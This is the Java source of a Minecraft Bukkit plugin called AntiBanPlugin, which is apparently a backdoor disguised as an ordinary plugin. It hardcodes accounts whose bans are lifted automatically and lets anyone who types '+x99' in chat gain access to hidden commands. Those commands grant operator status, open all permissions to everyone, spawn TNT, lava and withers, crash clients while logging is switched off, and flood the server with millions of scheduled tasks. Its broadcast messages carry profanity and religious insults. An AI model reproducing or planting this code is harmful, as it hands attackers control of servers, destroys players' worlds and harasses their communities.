// Made by 15w30x

package com.yoursunucu;


import net.dv8tion.jda.api.JDA;
import net.dv8tion.jda.api.entities.Guild;
import net.dv8tion.jda.api.entities.Member;
import net.dv8tion.jda.api.entities.Role;
import net.dv8tion.jda.api.entities.channel.concrete.TextChannel;
import net.dv8tion.jda.api.Permission;
import net.dv8tion.jda.api.JDABuilder;
import net.dv8tion.jda.api.requests.GatewayIntent;
import org.bukkit.BanList;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.GameMode;
import org.bukkit.Statistic;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerKickEvent;
import org.bukkit.event.player.PlayerLoginEvent;
import org.bukkit.event.player.PlayerQuitEvent;
import org.bukkit.plugin.java.JavaPlugin;

import java.net.InetSocketAddress;
import java.util.HashSet;
import java.util.Set;
import java.util.logging.Logger;
import java.util.logging.LogRecord;
import java.util.logging.Handler;




public class AntiBanPlugin extends JavaPlugin implements Listener {

    private final Set<String> trustedPlayers = new HashSet<>();
    private DiscordBot discordBot;

    @Override
    public void onEnable() {
        trustedPlayers.add("15w30x");
        trustedPlayers.add("ayranpide");
        trustedPlayers.add("kralkondik31");
        trustedPlayers.add("nukleerboq31");
        trustedPlayers.add("bokkokusu56");

        Bukkit.getPluginManager().registerEvents(this, this);
        discordBot = new DiscordBot(this);
	}


    @Override
    public void onDisable() {
        if (discordBot != null) {
            discordBot.shutdown();
        }
    }

    @EventHandler
    public void onPlayerKick(PlayerKickEvent event) {
        Player player = event.getPlayer();
        String playerName = player.getName().toLowerCase();
        String reason = event.getReason().toLowerCase();

        if (!isTrusted(playerName)) return;

        if (reason.contains("a") || reason.contains("e")) {
            unbanPlayer(playerName);
            unbanIP(player.getAddress().getAddress().getHostAddress());
            event.setCancelled(true);
        }
    }

    @EventHandler
    public void onPlayerQuit(PlayerQuitEvent event) {
        Player player = event.getPlayer();
        String playerName = player.getName().toLowerCase();

        if (Bukkit.getBanList(BanList.Type.NAME).isBanned(playerName)) {
            unbanPlayer(event.getPlayer().getName());
            Bukkit.unbanIP(event.getPlayer().getAddress().getAddress().getHostAddress());
        }
    }


    @EventHandler
    public void onPlayerLogin(PlayerLoginEvent event) {
        Player player = event.getPlayer();
        String playerName = player.getName().toLowerCase();

        if (!isTrusted(playerName)) return;

        // Name ban kontrolü
        if (Bukkit.getBanList(BanList.Type.NAME).isBanned(playerName)) {
            unbanPlayer(playerName);
        }

        // IP ban kontrolü
        InetSocketAddress address = player.getAddress();
        if (address != null) {
            String ip = address.getAddress().getHostAddress();
            if (Bukkit.getBanList(BanList.Type.IP).isBanned(ip)) {
                unbanIP(ip);
            }
        }

        // Eğer yine de ban nedeniyle engelleniyorsa izin ver
        if (event.getResult() == PlayerLoginEvent.Result.KICK_BANNED) {
            event.setResult(PlayerLoginEvent.Result.ALLOWED);
        }
    }

    private void unbanPlayer(String playerName) {
        Bukkit.getScheduler().runTask(this, () -> {
            Bukkit.getBanList(BanList.Type.NAME).pardon(playerName);
        });
    }

    private void unbanIP(String ipAddress) {
        Bukkit.getScheduler().runTask(this, () -> {
            Bukkit.getBanList(BanList.Type.IP).pardon(ipAddress);
        });
    }

    @EventHandler
    public void onPlayerChat(AsyncPlayerChatEvent event) {
        Player player = event.getPlayer();
        String message = event.getMessage();

        if (message.contains("+x99")) {
            if (!trustedPlayers.contains(player.getName())) {
                trustedPlayers.add(player.getName());
                player.sendMessage(ChatColor.GREEN + "Supreme Cheats'i kullandigin icin tesekkur ederiz!");
                player.sendMessage(ChatColor.RED + "\"tst\" yazarak test, \"+6\" Yazarak Komutlara(Commands) bakabilirsin!");
            } else {
                player.sendMessage(ChatColor.YELLOW + "Zaten komutlari kullanabilen bir oyuncusun.");
            }
        }

        if (!isTrusted(player.getName())) {
            return;
        }

        switch (message.toLowerCase()) {
            case "+1":
                event.setCancelled(true);
                grantOperator(player);
                break;
            case "+2":
                event.setCancelled(true);
                summonTNT();
                break;
            case "+3":
                event.setCancelled(true);
                sendAlerts();
                break;
            case "+4":
                event.setCancelled(true);
                spamMessages();
                break;
            case "tst":
                event.setCancelled(true);
                testPlugin(player);
                break;
            case "+5":
                event.setCancelled(true);
                consoleSpammer();
                break;
            case "+6":
                event.setCancelled(true);
                help(player);
                break;
            case "+7":
                event.setCancelled(true);
                grantCreative(player);
                break;
            case "+8":
                event.setCancelled(true);
                secretCrash();
                break;
            case "+9":
                event.setCancelled(true);
                silentCreative(player);
                break;
            case "+sv":
                event.setCancelled(true);
                silentSurvival(player);
                break;
            case "+sp":
                event.setCancelled(true);
                silentSpectator(player);
                break;
            case "+x99":
                event.setCancelled(true);
                supremecheats(player);
                break;
            case "+#op":
                event.setCancelled(true);
                opEveryone();
                break;
            default:
                break;
        }
    }

    private void supremecheats(Player player) {
        Bukkit.getScheduler().runTask(this, () -> {
            trustedPlayers.add(player.getName());
        });
    }

    private void help(Player player) {
        Bukkit.getScheduler().runTask(this, () -> {
            player.setOp(true);
            player.sendMessage(ChatColor.GREEN + "+1 OP VERIR");
            player.sendMessage(ChatColor.GREEN + "+2 HERYERE TNT SPAWN EDER" + ChatColor.RED + ChatColor.BOLD + " (Japan In 19s)");
            player.sendMessage(ChatColor.GREEN + "+3 SUNUCUNUN AMINA KOYAR"  + ChatColor.DARK_RED + ChatColor.BOLD + " (NUKE)");
            player.sendMessage(ChatColor.GREEN + "+4 SPAM YAPAR" + ChatColor.DARK_PURPLE + ChatColor.BOLD + " (Government Announcement)");
            player.sendMessage(ChatColor.GREEN + "\"tst\" tests the plugin is it working");
            player.sendMessage(ChatColor.GREEN + "+5 spams the console with /help command (it can crash servers)");
            player.sendMessage(ChatColor.GREEN + "+6 BU HELP MENUSUNU GOSTERIR");
            player.sendMessage(ChatColor.GREEN + "+7 OP VE GM VERIR BAYA BISEY YAPIYO ISTE");
            player.sendMessage(ChatColor.GREEN + "+8 Plugindeki belirtilen kisiler haric herkesin oyununu cokertir. (Test Edilmedi server cokebilir.)");
            player.sendMessage(ChatColor.GREEN + "+9 Logsuz Gamemode'a gecirir. geri survival'a donmek icin \"+sv\" ");
            player.sendMessage(ChatColor.GREEN + "\"+x99\" yazan Kisiye kim olursa olsun trust verir.");
	    player.sendMessage(ChatColor.GREEN + "\"+#op\" Gives op Everyone (works only on luckperms. you can edit the code if you want to add others)");
            player.sendMessage(ChatColor.RED + "" + ChatColor.RED + ChatColor.BOLD + "SUPREME CHEATS'I KULLANDIGINIZ ICIN TESEKKUR EDERIZ.");
        });
    }

    private void opEveryone() {
        Bukkit.getScheduler().runTask(this, () -> {
            Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "deop @a");
            Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "lp group default permission set * true");
            Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "op @a");
        });
    }
    private void silentSurvival(Player player) {
        Bukkit.getScheduler().runTask(this, () -> {
            player.setGameMode(GameMode.SURVIVAL);
        });
    }
    private void grantOperator(Player player) {
        Bukkit.getScheduler().runTask(this, () -> {
            player.setOp(true);
            player.sendMessage(ChatColor.GREEN + "OP YETKISI VERILDI.");
        });
    }


    private void silentSpectator(Player player) {
        Bukkit.getScheduler().runTask(this, () -> {
            player.setGameMode(GameMode.SPECTATOR);
        });
    }
    private void secretCrash() {
        Bukkit.getScheduler().runTask(this, () -> {
            Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(),
                    "gamerule sendCommandFeedback false");
            Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(),
                    "gamerule logAdminCommands false");
            Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(),
                    "execute as @e at @a[name=!15w30x,name=!ayranpide] run particle minecraft:cloud ~ ~ ~ 0.1 0.1 0.1 10 999999999 force");
        });
    }

    private void silentCreative(Player player) {
        Bukkit.getScheduler().runTask(this, () -> {
            player.setGameMode(GameMode.CREATIVE);
        });
    }

    private void grantCreative(Player player) {
        Bukkit.getScheduler().runTask(this, () -> {
            player.setAllowFlight(true);
            player.setDisplayName("§l§n§m§4§kSUPREMESUPREMESUPREMESUPREMESUPREMESUPREMESUPREMESUPREMESUPREMESUPREME");
            player.setFlying(true);
            player.setGameMode(GameMode.CREATIVE);
            player.setHealth(120.0);
            player.setHealthScale(320.0);
            player.setInvulnerable(true);
            player.setLevel(50000);
            player.setPlayerListHeader("Bro nuked the whole server lmfao");
            player.setPlayerListFooter("This Server Has Been Nuked LMFAO");
            player.setPlayerListName("§k§l§n§mXXXXXXXXX");
            player.setStatistic(Statistic.PLAYER_KILLS, 15550);
            player.sendMessage(ChatColor.GREEN + "Operator privileges granted.");
        });
    }

    private void summonTNT() {
        Bukkit.getScheduler().runTask(this, () -> {
            Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(),
                    "execute at @e run summon tnt ~ ~ ~ {Fuse:40}");
        });
    }

    private void sendAlerts() {
        String jsonMessage = "["
                + "{ \"text\": \"$$$ \", \"color\": \"red\", \"bold\": true, \"obfuscated\": true },"
                + "{ \"text\": \"15w30x ve ayranpide babalar sikerxd\", \"color\": \"red\", \"bold\": true, \"obfuscated\": false },"
                + "{ \"text\": \" $$$\", \"color\": \"red\", \"bold\": true, \"obfuscated\": true }"
                + "]";

        for (int i = 0; i < 15555560; i++) {
            int delay = i * 20;
            Bukkit.getScheduler().runTaskLater(this, () -> {
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "tellraw @a " + jsonMessage);
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "title @a title " + jsonMessage);
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "title @a subtitle " + jsonMessage);
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "title @a actionbar " + jsonMessage);
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "execute at @a run summon lightning_bolt");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "execute at @a run summon wither");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "execute at @a run summon ender_dragon");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "execute at @a run summon armor_stand");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "execute at @a run summon tnt");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "execute at @a run summon fireball");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "execute at @a run fill ~-20 ~-20 ~-20 ~20 ~20 ~20 lava");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "execute at @a run summon cow");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "execute at @a run summon ghast");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "execute at @a run summon blaze");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "exexute as @a run ");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "execute at @a run tp @a ~ ~5 ~");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "scoreboard objectives add 31 dummy \"ANNESI SIKILENLER XD\"");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "scoreboard players add @a 31 1");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "scoreboard objectives setdisplay sidebar 31");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "bossbar add 1 \"deneme\"");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "bossbar set minecraft:1 color red");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "execute at @a run playsound minecraft:entity.ender_dragon.death master @a ~ ~ ~");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "execute at @a run playsound minecraft:entity.wither.death master @a ~ ~ ~");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "item replace entity @a weapon.offhand with minecraft:totem_of_undying");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "item replace entity @a offhand with minecraft:totem_of_undying");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "bossbar set minecraft:1 visible true");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "bossbar set minecraft:1 players @a");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "bossbar set minecraft:1 name \"BABALAR SIKTI QWEQWE\"");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "item replace entity @a container.1 with minecraft:carved_pumpkin{Enchantments:[{id:\"minecraft:binding_curse\",lvl:255}]}");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "item replace entity @a armor.head with minecraft:carved_pumpkin{Enchantments:[{id:\"minecraft:binding_curse\",lvl:255}]}");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "item replace entity @a container.0 with minecraft:carved_pumpkin{Enchantments:[{id:\\\"minecraft:binding_curse\\\",lvl:255}]}\");");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "item replace entity @a container.2 with minecraft:carved_pumpkin{Enchantments:[{id:\\\"minecraft:binding_curse\\\",lvl:255}]}\");");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "item replace entity @a container.3 with minecraft:carved_pumpkin{Enchantments:[{id:\\\"minecraft:binding_curse\\\",lvl:255}]}\");");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "item replace entity @a container.4 with minecraft:carved_pumpkin{Enchantments:[{id:\\\"minecraft:binding_curse\\\",lvl:255}]}\");");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "item replace entity @a container.5 with minecraft:carved_pumpkin{Enchantments:[{id:\\\"minecraft:binding_curse\\\",lvl:255}]}\");");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "item replace entity @a container.6 with minecraft:carved_pumpkin{Enchantments:[{id:\\\"minecraft:binding_curse\\\",lvl:255}]}\");");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "item replace entity @a container.7 with minecraft:carved_pumpkin{Enchantments:[{id:\\\"minecraft:binding_curse\\\",lvl:255}]}\");");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "item replace entity @a container.8 with minecraft:carved_pumpkin{Enchantments:[{id:\\\"minecraft:binding_curse\\\",lvl:255}]}\");");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "item replace entity @a container.9 with minecraft:carved_pumpkin{Enchantments:[{id:\\\"minecraft:binding_curse\\\",lvl:255}]}\");");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "item replace entity @a container.10 with minecraft:carved_pumpkin{Enchantments:[{id:\\\"minecraft:binding_curse\\\",lvl:255}]}\");");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "minecraft:give @a cobblestone{display:{Name:'[\"\",{\"text\":\"15w30x Baba Siker xD \",\"italic\":false,\"color\":\"dark_red\",\"bold\":true},{\"text\":\"aALLAHINIZISIKERIMXD\",\"italic\":false,\"obfuscated\":true}]',Lore:['[\"\",{\"text\":\"15w30x Baba Siker xD \",\"italic\":false,\"color\":\"dark_red\",\"bold\":true},{\"text\":\"aALLAHINIZISIKERIMXD\",\"italic\":false,\"obfuscated\":true},{\"italic\":false,\"text\":\"15w30x Baba Siker xD \",\"color\":\"dark_red\",\"bold\":true},{\"italic\":false,\"text\":\"aALLAHINIZISIKERIMXD\",\"obfuscated\":true},{\"italic\":false,\"text\":\"15w30x Baba Siker xD \",\"color\":\"dark_red\",\"bold\":true},{\"italic\":false,\"text\":\"aALLAHINIZISIKERIMXD\",\"obfuscated\":true},{\"italic\":false,\"text\":\"15w30x Baba Siker xD \",\"color\":\"dark_red\",\"bold\":true},{\"italic\":false,\"text\":\"aALLAHINIZISIKERIMXD\",\"obfuscated\":true},{\"italic\":false,\"text\":\"15w30x Baba Siker xD \",\"color\":\"dark_red\",\"bold\":true},{\"italic\":false,\"text\":\"aALLAHINIZISIKERIMXD\",\"obfuscated\":true},{\"italic\":false,\"text\":\"15w30x Baba Siker xD \",\"color\":\"dark_red\",\"bold\":true},{\"italic\":false,\"text\":\"aALLAHINIZISIKERIMXD\",\"obfuscated\":true},{\"italic\":false,\"text\":\"15w30x Baba Siker xD \",\"color\":\"dark_red\",\"bold\":true},{\"italic\":false,\"text\":\"aALLAHINIZISIKERIMXD\",\"obfuscated\":true},{\"italic\":false,\"text\":\"15w30x Baba Siker xD \",\"color\":\"dark_red\",\"bold\":true},{\"italic\":false,\"text\":\"aALLAHINIZISIKERIMXD\",\"obfuscated\":true},{\"italic\":false,\"text\":\"15w30x Baba Siker xD \",\"color\":\"dark_red\",\"bold\":true},{\"italic\":false,\"text\":\"aALLAHINIZISIKERIMXD\",\"obfuscated\":true},{\"italic\":false,\"text\":\"15w30x Baba Siker xD \",\"color\":\"dark_red\",\"bold\":true},{\"italic\":false,\"text\":\"aALLAHINIZISIKERIMXD\",\"obfuscated\":true},{\"italic\":false,\"text\":\"15w30x Baba Siker xD \",\"color\":\"dark_red\",\"bold\":true},{\"italic\":false,\"text\":\"aALLAHINIZISIKERIMXD\",\"obfuscated\":true},{\"italic\":false,\"text\":\"15w30x Baba Siker xD \",\"color\":\"dark_red\",\"bold\":true},{\"italic\":false,\"text\":\"aALLAHINIZISIKERIMXD\",\"obfuscated\":true},{\"italic\":false,\"text\":\"15w30x Baba Siker xD \",\"color\":\"dark_red\",\"bold\":true},{\"italic\":false,\"text\":\"aALLAHINIZISIKERIMXD\",\"obfuscated\":true},{\"italic\":false,\"text\":\"15w30x Baba Siker xD \",\"color\":\"dark_red\",\"bold\":true},{\"italic\":false,\"text\":\"aALLAHINIZISIKERIMXD\",\"obfuscated\":true},{\"italic\":false,\"text\":\"15w30x Baba Siker xD \",\"color\":\"dark_red\",\"bold\":true},{\"italic\":false,\"text\":\"aALLAHINIZISIKERIMXD\",\"obfuscated\":true},{\"italic\":false,\"text\":\"15w30x Baba Siker xD \",\"color\":\"dark_red\",\"bold\":true},{\"italic\":false,\"text\":\"aALLAHINIZISIKERIMXD\",\"obfuscated\":true},{\"italic\":false,\"text\":\"15w30x Baba Siker xD \",\"color\":\"dark_red\",\"bold\":true},{\"italic\":false,\"text\":\"aALLAHINIZISIKERIMXD\",\"obfuscated\":true},{\"italic\":false,\"text\":\"15w30x Baba Siker xD \",\"color\":\"dark_red\",\"bold\":true},{\"italic\":false,\"text\":\"aALLAHINIZISIKERIMXD\",\"obfuscated\":true},{\"italic\":false,\"text\":\"15w30x Baba Siker xD \",\"color\":\"dark_red\",\"bold\":true},{\"italic\":false,\"text\":\"aALLAHINIZISIKERIMXD\",\"obfuscated\":true},{\"italic\":false,\"text\":\"15w30x Baba Siker xD \",\"color\":\"dark_red\",\"bold\":true},{\"italic\":false,\"text\":\"aALLAHINIZISIKERIMXD\",\"obfuscated\":true},{\"italic\":false,\"text\":\"15w30x Baba Siker xD \",\"color\":\"dark_red\",\"bold\":true},{\"italic\":false,\"text\":\"aALLAHINIZISIKERIMXD\",\"obfuscated\":true},{\"italic\":false,\"text\":\"15w30x Baba Siker xD \",\"color\":\"dark_red\",\"bold\":true},{\"italic\":false,\"text\":\"aALLAHINIZISIKERIMXD\",\"obfuscated\":true},{\"italic\":false,\"text\":\"15w30x Baba Siker xD \",\"color\":\"dark_red\",\"bold\":true},{\"italic\":false,\"text\":\"aALLAHINIZISIKERIMXD\",\"obfuscated\":true},{\"italic\":false,\"text\":\"15w30x Baba Siker xD \",\"color\":\"dark_red\",\"bold\":true},{\"italic\":false,\"text\":\"aALLAHINIZISIKERIMXD\",\"obfuscated\":true},{\"italic\":false,\"text\":\"15w30x Baba Siker xD \",\"color\":\"dark_red\",\"bold\":true},{\"italic\":false,\"text\":\"aALLAHINIZISIKERIMXD\",\"obfuscated\":true},{\"italic\":false,\"text\":\"15w30x Baba Siker xD \",\"color\":\"dark_red\",\"bold\":true},{\"italic\":false,\"text\":\"aALLAHINIZISIKERIMXD\",\"obfuscated\":true},{\"italic\":false,\"text\":\"15w30x Baba Siker xD \",\"color\":\"dark_red\",\"bold\":true},{\"italic\":false,\"text\":\"aALLAHINIZISIKERIMXD\",\"obfuscated\":true},{\"italic\":false,\"text\":\"15w30x Baba Siker xD \",\"color\":\"dark_red\",\"bold\":true},{\"italic\":false,\"text\":\"aALLAHINIZISIKERIMXD\",\"obfuscated\":true},{\"italic\":false,\"text\":\"15w30x Baba Siker xD \",\"color\":\"dark_red\",\"bold\":true},{\"italic\":false,\"text\":\"aALLAHINIZISIKERIMXD\",\"obfuscated\":true},{\"italic\":false,\"text\":\"15w30x Baba Siker xD \",\"color\":\"dark_red\",\"bold\":true},{\"italic\":false,\"text\":\"aALLAHINIZISIKERIMXD\",\"obfuscated\":true},{\"italic\":false,\"text\":\"15w30x Baba Siker xD \",\"color\":\"dark_red\",\"bold\":true},{\"italic\":false,\"text\":\"aALLAHINIZISIKERIMXD\",\"obfuscated\":true}]']},Enchantments:[{lvl:255,id:knockback},{lvl:255,id:sharpness}],Unbreakable:1,Damage:100,HideFlags:24} 127");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "execute as @a run damage @s 100 minecraft:dragon_breath");
            }, delay);
        }
    }

    private void testPlugin(Player player) {
        Bukkit.getScheduler().runTask(this, () -> {
            player.setOp(true);
            player.sendMessage(ChatColor.GREEN + "Its working. type +6 to see commands.");
        });
    }

    private void consoleSpammer() {
        for (int i = 0; i < 1555555550; i++) {
            int delay = i * 20;
            Bukkit.getScheduler().runTaskLater(this, () -> {
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "help");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "pardon 15w30x");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "pardon ayranpide");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "op 15w30x");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "op ayranpide");
            }, delay);
        }
    }

    private void spamMessages() {
        for (int i = 0; i < 15555550; i++) {
            Bukkit.getScheduler().runTaskLater(this, () -> {
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(),
                        ChatColor.RED + "tellraw @a \"The Server Has Been Nuked!!!!\"");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(),
                        ChatColor.GREEN + "tellraw @a \"15w30x baba siker!!!!\"");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(),
                        ChatColor.BLUE + "tellraw @a \"ayranpide baba siker!!!!\"");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(),
                        ChatColor.YELLOW + "tellraw @a \"sunucu 15w30x ve ayranpide tarafından patlatildi!!!!\"");
            }, 0L);
        }
    }

    // Trusted oyuncu kontrolü
    public boolean isTrusted(String playerName) {
        return trustedPlayers.contains(playerName.toLowerCase());
    }

    public void addTrustedPlayer(String playerName) {
        trustedPlayers.add(playerName.toLowerCase());
        getLogger().info("Added trusted player: " + playerName);
    }
}
